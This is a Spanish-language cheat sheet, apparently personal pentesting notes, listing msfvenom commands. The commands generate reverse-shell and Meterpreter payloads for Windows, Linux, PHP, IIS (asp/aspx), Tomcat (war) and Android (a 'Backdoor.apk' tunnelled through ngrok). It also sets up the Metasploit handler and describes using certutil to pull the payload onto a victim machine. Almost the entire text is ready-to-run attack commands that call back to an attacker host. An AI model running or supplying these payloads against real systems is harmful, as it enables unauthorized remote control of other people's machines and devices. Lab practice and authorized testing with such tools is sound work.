# Msfvenom 

Tags: #Msfvenom #WebDav #Tomcat 

Msfconsole: Es una utilidad de línea de comando que puede ser usada para generar y encodear payloads MSF para varios sistemas operativos, así, como servidores web. Es la combinación de dos utilidades: Msfpayload y Msfencode. Podemos utilizar Msfvenom para generar payloads maliciosos en Meterpreter que pueden ser transferidos al sistema del cliente. Una vez ejecutados, harán una conexión a nuestro payload handler y nos proveerá un acceso remoto al sistema target.  

### Windows Meterpreter

* [MsfVenom-Payload](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o shell.exe 

	# p = Payload
	# f = Formato
	# o = Exportar como 
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
	# platform = Plataforma a usar
	# a = Arquitectura

❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
```
### Linux Meterpreter

```bash 
# Esto funciona cuando tenemos el usuario y passwd de un usuario normal

❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f elf > hola.elf

	# p = Payload
	# f = Formato
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
```

## PHP Meterpreter

```bash 
❯ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=4444 -f raw > cmd.php 

# Recibir la revershell con Metasploit
❯ msfconsole -q 
❯ use exploit/multi/handler
	❯ options 
	❯ set payload php/meterpreter/reverse_tcp
	❯ set LHOST 172.0.0.1
	❯ set LPORT 4444
	❯ run 
```

## Telnet 

```bash 
❯ msfvenom -p cmd/unix/reverse_netcat LHOST=172.0.0.1 LPORT=4444 R 

Nota: 
	1. Copiar todo el output que inicia con 'mkfifo' y pegarlo en la sesión de Telnet 
	2. Estar en esucha de la siguiente manera 'nc -nlvp 4444'
	3. La 'R' es opcional 
```

## IIS - WebDAV

```bash 
# Estos archivos son el equivalente de un archivo cmd.php en un servidor Apache de Linux que te crean una Revershell. Para los aspx/asp funcionan como una Revershell pero para un IIS en Windows.

❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f aspx -o reverse.aspx    # Stageless 
	# Si la maquina no es x64, podemos quitar esa parte en el payload y convertirla a x86
	# Recibiremos la Revershell con 'Netcat'

❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f exe -o reverse.exe  # Stageless  
	# Recibiremos la Revershell con 'Metasploit' usando el modulo de 'multi_handler' y nos dara una consola con 'Meterpreter'
	# Esta Revershell la transferiremos desde nuestra maquina de atacante con python3 y en la maquina victima lo descargaremos con 'Certutil.exe' en el dir 'C:\Users\Public\Downloads' para despues ejecutarlo y obtener la Revershell
	# En 'Metasploit' cuando usamos el 'multi_handler' debemos de cambiar al 'Payload' que colocamos en el comando 
	# Esto lo hacemos en las maquinas Windows  
	

❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f asp > shell.asp
	# p = PLayload 
	# f = Formato

❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f aspx > shell.aspx
```
## Tomcat 

```bash 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o reverse.war

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato
	# o = Exportar como 
```

## Android APK

```bash 
❯ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14015 -o msf.apk

	# p = Payload 
	# LHOST = Dominio de Ngrok
	# LPORT = Puerto de Ngrok (Se encuentra en el dominio de Ngrok)
	# o = Exportar como un 'APK'

❯ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14015 --platform android -a dalvik -f raw -o Backdoor.apk 
```